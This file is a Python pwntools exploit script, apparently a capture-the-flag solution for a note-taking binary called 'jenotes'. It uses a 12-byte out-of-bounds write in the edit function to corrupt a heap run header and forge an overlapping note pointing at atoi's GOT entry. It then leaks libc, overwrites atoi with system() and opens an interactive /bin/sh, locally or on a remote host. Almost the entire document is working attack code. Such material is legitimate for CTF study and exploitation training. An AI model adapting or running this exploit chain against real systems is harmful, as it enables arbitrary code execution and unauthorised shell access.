#!/usr/bin/env python3
# Run header corruption -> GOT overwrite -> system()
# python3 solve.py                   # local
# python3 solve.py REMOTE host port  # remote
import sys
from pwn import *

context.binary = elf = ELF('./jenotes', checksec=False)
context.log_level = 'info'
libc = ELF('./libc.so.6', checksec=False)

atoi_got = elf.got['atoi']

NOTELEN = 64 # fixed note buffer size
OOB = 12 # edit() reads len + 12  <-- the bug
FILL = 31 # notes 0..30 fill R1 regions 0..61
VULN = 31 # last buffer slot in R1 (62)
RECLAIM = 32 # its buffer is served from corrupted R2


def start():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process([elf.path])


# menu helpers
def add(io, i, name=b'f\n', data=b'f\n'):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx: ', str(i).encode())
    io.sendafter(b'name: ', name)
    io.sendafter(b'data: ', data)

def edit(io, i, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(i).encode())
    io.sendafter(b'data: ', data)

def show(io, i):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(i).encode())
    return io.recvline()


io = start()

# Fill run 1
for i in range(FILL):
    add(io, i)

# Create a new run 2 by adding another note.
add(io, VULN)

# Overwrite run 2's header using the OOB in notes[31]
payload  = b'A' * NOTELEN 
payload += p32(0x41414141) # R2->bin
payload += p32(0xfffffffe) # R2->regs_minelm = -2, causes next alloc to return notes[0]
payload += p32(1)          # R2->nfree = 1 
assert len(payload) == NOTELEN + OOB
edit(io, VULN, payload)

# Overlapping alloc at notes[0], edit so that it's .data points to atoi@got, and its .len is 8. 
fake  = b'B' * 56                    # struct note .name[56]
fake += p32(atoi_got)                # .data  -> atoi@got
fake += p32(8)                       # .len   -> 8
assert len(fake) == NOTELEN
add(io, RECLAIM, name=b'o\n', data=fake)

# Leak atoi@got using show()
leak = show(io, 0)
atoi = u32(leak[:4])
libc.address = atoi - libc.sym['atoi']
system = libc.sym['system']
log.success('atoi = %#x', atoi)
log.success('libc base = %#x', libc.address)
log.success('system = %#x', system)

# Overwrite atoi@got with system()
edit(io, 0, p32(system))

# Call atoi() which now points as system(/bin/sh)
io.sendlineafter(b'> ', b'/bin/sh')
io.interactive()
